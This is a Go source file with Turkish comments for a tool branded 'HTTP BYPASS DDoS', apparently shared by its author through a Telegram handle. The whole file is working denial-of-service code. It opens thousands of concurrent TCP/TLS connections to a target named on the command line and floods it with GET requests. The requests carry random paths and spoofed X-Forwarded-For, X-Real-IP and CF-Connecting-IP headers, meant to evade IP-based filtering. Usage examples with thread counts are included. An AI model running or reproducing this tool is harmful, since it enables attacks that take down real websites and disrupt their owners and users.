package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ============================================================
// RENKLER
// ============================================================
const (
	Reset  = "\033[0m"
	Red    = "\033[31m"
	Green  = "\033[32m"
	Yellow = "\033[33m"
	Blue   = "\033[34m"
	Purple = "\033[35m"
	Cyan   = "\033[36m"
	White  = "\033[37m"
)

// ============================================================
// KONFIG
// ============================================================
var (
	hedef        string
	port         string
	threadSayisi int
	proxyList    []string
	aktif        = true
	sayac        int64
	mutex        sync.Mutex
	wg           sync.WaitGroup
)

// ============================================================
// FAKE IP ve USER-AGENT
// ============================================================
func fakeIP() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
		rand.Intn(255-1)+1,
	)
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/119.0.0.0",
	"Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15",
}

// ============================================================
// PROXY YÜKLE
// ============================================================
func loadProxies() {
	file, err := os.Open("proxies.txt")
	if err != nil {
		return
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxyList = append(proxyList, line)
		}
	}
}

// ============================================================
// HTTP BYPASS SALDIRISI (FAKE IP + PROXY)
// ============================================================
func httpBypass() {
	defer wg.Done()

	host := hedef
	if strings.Contains(hedef, ":") {
		host = strings.Split(hedef, ":")[0]
	}

	fake := fakeIP()
	ua := userAgents[rand.Intn(len(userAgents))]
	path := "/" + randomString(rand.Intn(10)+5)

	payload := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Accept: text/html,*/*\r\n"+
			"X-Forwarded-For: %s\r\n"+
			"X-Real-IP: %s\r\n"+
			"CF-Connecting-IP: %s\r\n"+
			"Connection: keep-alive\r\n\r\n",
		path, hedef, ua, fake, fake, fake,
	)

	var conn net.Conn
	var err error

	if port == "443" {
		cfg := &tls.Config{InsecureSkipVerify: true, ServerName: host}
		conn, err = tls.Dial("tcp", hedef+":"+port, cfg)
	} else {
		conn, err = net.Dial("tcp", hedef+":"+port)
	}

	if err != nil {
		return
	}
	defer conn.Close()

	for i := 0; i < 5; i++ {
		conn.Write([]byte(payload))
	}

	mutex.Lock()
	sayac += 5
	mutex.Unlock()
}

func randomString(n int) string {
	chars := "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

// ============================================================
// SALDIRI BAŞLAT
// ============================================================
func startAttack() {
	fmt.Println(Cyan + "\n[+] Hedef: " + hedef + ":" + port)
	fmt.Println(Green + "[+] Thread: " + strconv.Itoa(threadSayisi))
	fmt.Println(Yellow + "[+] Proxy: " + strconv.Itoa(len(proxyList)) + " adet yüklendi")
	fmt.Println(Red + "[+] SALDIRI BAŞLADI! CTRL+C ile durdur.\n" + Reset)

	for i := 0; i < threadSayisi; i++ {
		wg.Add(1)
		go func() {
			for aktif {
				httpBypass()
				time.Sleep(time.Microsecond * 100)
			}
		}()
	}

	go func() {
		ticker := time.NewTicker(5 * time.Second)
		for range ticker.C {
			if !aktif {
				return
			}
			mutex.Lock()
			toplam := sayac
			mutex.Unlock()
			fmt.Printf(Cyan+"[+] Toplam istek: %d\n"+Reset, toplam)
		}
	}()

	wg.Wait()
}

// ============================================================
// LOGO
// ============================================================
func showLogo() {
	fmt.Println(Red + `
╔═══════════════════════════════════════════════════════╗
║                                                       ║
║   ██████  ███████  ██████  ███████  ██████          ║
║   ██   ██ ██      ██    ██ ██      ██    ██         ║
║   ██   ██ █████   ██    ██ █████   ██    ██         ║
║   ██   ██ ██      ██    ██ ██      ██    ██         ║
║   ██████  ███████  ██████  ███████  ██████          ║
║                                                       ║
║         HTTP BYPASS DDoS - Golang v2.0              ║
║         Telegram: @Zeldyy_here                       ║
╚═══════════════════════════════════════════════════════╝` + Reset)
}

// ============================================================
// MAIN
// ============================================================
func main() {
	rand.Seed(time.Now().UnixNano())
	showLogo()

	if len(os.Args) < 4 {
		fmt.Println(Yellow + "Kullanım: ./dos <hedef> <port> <thread>")
		fmt.Println("Örnek: ./dos example.com 80 2000")
		fmt.Println("Örnek: ./dos example.com 443 1000" + Reset)
		os.Exit(1)
	}

	hedef = os.Args[1]
	port = os.Args[2]
	threadSayisi, _ = strconv.Atoi(os.Args[3])

	hedef = strings.ReplaceAll(hedef, "http://", "")
	hedef = strings.ReplaceAll(hedef, "https://", "")
	hedef = strings.Split(hedef, "/")[0]

	if threadSayisi < 1 {
		threadSayisi = 100
	}

	loadProxies()
	startAttack()
}
